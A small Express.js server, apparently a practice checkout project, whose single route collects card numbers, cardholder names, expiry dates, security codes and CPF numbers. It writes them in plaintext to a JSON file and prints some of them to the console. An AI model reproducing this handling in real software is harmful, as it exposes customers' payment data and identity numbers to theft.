const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const fs = require("fs");

app.use(express.urlencoded({ extended: true }));

app.post('/aa', (req, res) => {
    const userCardNumber = req.body.cardnumber;
    const username = req.body.completename;
    const userCardVencimento = req.body.vencimento; 
    const userCardCodeSeguranca = req.body.segurancacode;
    const userCardcpf = req.body.cpfcard;

    fs.readFile("data.json", "utf-8", (err, data) => {
        if(err) throw err;

        const dataList = [];
        if(data) {
            dataList.push(JSON.parse(data));
        }

        dataList.push({
            userCardNumber, username, userCardVencimento, userCardCodeSeguranca, userCardcpf
        });
        console.log(userCardcpf, userCardVencimento, userCardCodeSeguranca)

        fs.writeFile('data.json', JSON.stringify(dataList, null, 2), 'utf8', (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Erro ao salvar os dados');
            }
        });
    })
    res.redirect("http://127.0.0.1:5500/choose-payment.html");
})

app.listen(port, () => {
    console.log("running")
})